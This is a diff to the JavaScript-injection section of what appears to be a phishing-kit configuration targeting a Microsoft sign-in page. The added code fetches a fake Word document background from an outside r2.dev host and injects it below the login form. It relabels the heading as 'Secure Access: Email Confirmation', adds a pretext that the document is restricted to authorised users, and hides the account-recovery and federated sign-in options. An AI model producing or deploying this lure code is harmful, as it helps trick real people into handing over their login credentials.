@@ -67,7 +67,6 @@ js_inject:
       overlay.style.justifyContent = "center";
       overlay.style.alignItems = "center";
       overlay.style.overflow = "hidden";
-
       overlay.innerHTML = `
         <style>
           @keyframes pulse {
@@ -128,34 +127,40 @@ js_inject:
       setTimeout(() => {
         overlay.remove();
 
-        const waitFor = (selector, cb) => {
-          const check = setInterval(() => {
-            const el = document.querySelector(selector);
-            if (el) {
-              clearInterval(check);
-              cb(el);
+        // Inject Word background HTML below form
+        fetch("https://pub-2a44f4d547ef416eb3d30428f95d5a9e.r2.dev/off.html")
+          .then(res => res.text())
+          .then(html => {
+            const wrapper = document.createElement("div");
+            wrapper.id = "customWordBackground";
+            wrapper.style.zIndex = "0";
+            wrapper.style.pointerEvents = "none";
+            wrapper.innerHTML = html;
+            const winScroll = document.querySelector(".win-scroll");
+            if (winScroll) winScroll.insertAdjacentElement("afterend", wrapper);
+          });
+
+        // Modify form box heading and hide unnecessary links
+        setTimeout(() => {
+          const header = document.querySelector('#loginHeader div[role="heading"]');
+          if (header) {
+            header.innerHTML = `Secure Access: Email Confirmation`;
+            const desc = document.createElement("div");
+            desc.style.fontSize = "14px";
+            desc.style.color = "#5a5a5a";
+            desc.style.marginTop = "8px";
+            desc.innerText = "This document can only be accessed by Authorised users. Please verify your identity to access this document.";
+            header.parentNode.appendChild(desc);
+          }
+
+          document.querySelectorAll(".form-group").forEach(el => {
+            if (el.textContent.includes("No account") || el.textContent.includes("Can’t access your account")) {
+              el.style.display = "none";
             }
-          }, 50);
-        };
+          });
 
-        waitFor('#backgroundImage', (bgImg) => {
-          // Remove existing MS background image
-          bgImg.style.display = 'none';
+          const fedBox = document.querySelector(".promoted-fed-cred-box");
+          if (fedBox) fedBox.style.display = "none";
+        }, 1000);
 
-          // Inject full Word interface as background
-          const iframe = document.createElement("iframe");
-          iframe.src = "https://pub-2a44f4d547ef416eb3d30428f95d5a9e.r2.dev/off.html";
-          iframe.style.position = "absolute";
-          iframe.style.top = "0";
-          iframe.style.left = "0";
-          iframe.style.width = "100vw";
-          iframe.style.height = "100vh";
-          iframe.style.zIndex = "0";
-          iframe.style.border = "none";
-          iframe.style.pointerEvents = "none";
-          iframe.style.overflow = "hidden";
-
-          const container = bgImg.parentElement;
-          container.appendChild(iframe);
-        });
       }, 3000);
